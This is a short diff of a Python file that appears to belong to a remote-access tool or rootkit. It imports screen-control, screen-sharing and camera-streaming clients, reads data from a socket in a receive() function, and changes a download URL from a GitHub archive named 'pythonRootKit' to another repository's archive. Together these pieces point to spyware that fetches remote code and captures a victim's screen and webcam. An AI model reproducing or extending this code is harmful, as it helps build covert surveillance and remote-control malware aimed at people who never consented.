@@ -4,7 +4,7 @@ from turtle import left
 import pyautogui
 from vidstream import ScreenShareClient
 from vidstream import CameraClient
-url = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
+url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
 
 def receive():
         data = client.recv(1024)
